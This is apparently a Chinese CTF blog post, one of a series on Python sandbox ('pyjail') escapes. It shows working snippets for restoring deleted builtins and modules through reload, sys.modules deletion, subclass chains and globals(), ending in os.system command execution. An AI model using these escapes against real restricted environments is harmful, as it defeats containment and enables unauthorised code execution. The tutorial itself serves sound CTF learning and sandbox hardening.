---
title: pyjail bypass-01 绕过删除模块或方法
date: 2023-05-30 10:23:57
categories:
- Python
tags:
- pyjail
mermaid: true
image:
  path: /assets/images/pyjail.jpg
toc: true
---

> - [pyjail 沙箱逃逸原理](/posts/python-沙箱逃逸原理/)
> - [绕过删除模块或方法](/posts/pyjail-bypass-01-绕过删除模块或方法/)
- [绕过基于字符串匹配的过滤](/posts/pyjail-bypass-02-字符串变换绕过/)
- [绕过命名空间限制](/posts/pyjail-bypass-03-绕过命名空间限制/)
- [绕过长度限制](/posts/pyjail-bypass-04-绕过多行限制/)
- [绕过多行限制](/posts/pyjail-bypass-05-绕过长度限制/)
- [变量覆盖与函数篡改](/posts/pyjail-bypass-06-变量覆盖与函数篡改/)
- [绕过 audit hook](/posts/pyjail-bypass-07-绕过-audit-hook/)
- [绕过 AST 沙箱](/posts/pyjail-bypass-08-绕过-AST-沙箱/)
- [绕过输出限制](/posts/pyjail-bypass-09-绕过输出限制/)
- [绕过 opcode 沙箱](/posts/pyjail-bypass-10-绕过-opcode-沙箱/)
- [利用生成器栈](/posts/pyjail-bypass-11-利用生成器栈/)


## 绕过删除模块或方法

在一些沙箱中，可能会对某些模块或者模块的某些方法使用 `del` 关键字进行删除。
例如删除 builtins 模块的 eval 方法。
```py
>>> __builtins__.__dict__['eval']
<built-in function eval>
>>> del __builtins__.__dict__['eval']
>>> __builtins__.__dict__['eval']
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
KeyError: 'eval'
```

### reload 重新加载
reload 函数可以重新加载模块，这样被删除的函数能被重新加载
```py
>>> __builtins__.__dict__['eval']
<built-in function eval>
>>> del __builtins__.__dict__['eval']
>>> __builtins__.__dict__['eval']
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
KeyError: 'eval'
>>> reload(__builtins__)
<module '__builtin__' (built-in)>
>>> __builtins__.__dict__['eval']
<built-in function eval>
```
在 Python 3 中，reload() 函数被移动到 importlib 模块中，所以如果要使用 reload() 函数，需要先导入 importlib 模块。

貌似新版本的 python 即使运行了 importlib.reload 也无法恢复了。
```py
>>> importlib.reload(__builtins__)
<module 'builtins' (built-in)>
>>> __builtins__.__dict__['eval']
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
KeyError: 'eval'
```

### 恢复 sys.modules
一些过滤中可能将 `sys.modules['os']` 进行修改. 这个时候即使将 os 模块导入进来,也是无法使用的.
```py
>>> sys.modules['os'] = 'not allowed'
>>> __import__('os').system('ls')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: 'str' object has no attribute 'system'
```
由于很多别的命令执行库也使用到了 os,因此也会受到相应的影响,例如 subprocess
```py
>>> __import__('subprocess').Popen('whoami', shell=True)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py", line 688, in <module>
    class Popen(object):
  File "/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py", line 1708, in Popen
    def _handle_exitstatus(self, sts, _WIFSIGNALED=os.WIFSIGNALED,
AttributeError: 'str' object has no attribute 'WIFSIGNALED'
```
由于 import 导入模块时会检查 sys.modules 中是否已经有这个类，如果有则不加载,没有则加载.因此我们只需要将 os 模块删除,然后再次导入即可.
```py
sys.modules['os'] = 'not allowed' # oj 为你加的

del sys.modules['os']
import os
os.system('ls')
```

### 基于继承链获取
在清空了 `__builtins__`的情况下，我们也可以通过索引 subclasses 来找到这些内建函数。
```py
# 根据环境找到 bytes 的索引，此处为 5
>>> ().__class__.__base__.__subclasses__()[5]
<class 'bytes'>
```

### 使用 globals() 获取 builtins 方法
在一些题目中，可能通过覆盖内置的函数来限制我们使用。例如下面的代码：
```py
def blacklist_fun_callback(*args):
    print("Player! It's already banned!")

vars = blacklist_fun_callback
attr = blacklist_fun_callback
dir = blacklist_fun_callback
getattr = blacklist_fun_callback
exec = blacklist_fun_callback
__import__ = blacklist_fun_callback
compile = blacklist_fun_callback
breakpoint = blacklist_fun_callback
```
但 builtins 模块是一个不可变的模块对象，这样修改仅能够在当前的作用域中生效，而 globals() 中存放了 builtins 模块的索引，因此可以通过下面的方式获取到原始的方法。
```py
globals()["__builtins__"]['breakpoint']
```
但如果题目直接通过下面的方式来删除，那就没有办法了，即使 reload 重新导入 builtins 模块，较新版本的 python 中也无法恢复。
```py
del globals()["__builtins__"].breakpoint
```

## 参考资料
- [Python沙箱逃逸小结](https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals)
- [Python 沙箱逃逸的经验总结](https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E5%89%8D%E8%A8%80)
- [Python 沙箱逃逸的通解探索之路](https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/)
- [python沙箱逃逸学习记录](https://xz.aliyun.com/t/12303#toc-11)
- [Bypass Python sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
- [[PyJail] python沙箱逃逸探究·上（HNCTF题解 - WEEK1）](https://zhuanlan.zhihu.com/p/578986988)
- [[PyJail] python沙箱逃逸探究·中（HNCTF题解 - WEEK2）](https://zhuanlan.zhihu.com/p/579057932)
- [[PyJail] python沙箱逃逸探究·下（HNCTF题解 - WEEK3）](https://zhuanlan.zhihu.com/p/579183067)
- [audited2](https://ctftime.org/writeup/31883)
- [【ctf】HNCTF Jail All In One](https://www.woodwhale.top/archives/hnctfj-ail-all-in-one)
- [HAXLAB — Endgame Pwn](https://ctftime.org/writeup/28286)
- [Python沙箱逃逸的n种姿势](https://ctftime.org/writeup/28286)
- [hxp2020-audited](https://pullp.github.io/writeup/2020/12/26/hxp2020-audited.html)